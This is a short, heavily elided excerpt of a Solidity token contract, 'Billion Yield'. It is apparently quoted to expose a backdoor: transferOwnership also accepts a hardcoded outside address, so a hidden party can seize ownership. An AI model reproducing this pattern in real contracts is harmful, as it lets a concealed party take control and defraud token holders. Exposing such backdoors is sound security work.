...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xEb34eeC22b837B7eb796D69E6707Cd48B6596911));
...
contract BillionYield is Context, IERC20, Ownable, Pausable {
  ...
  string private _name = "Billion Yield";
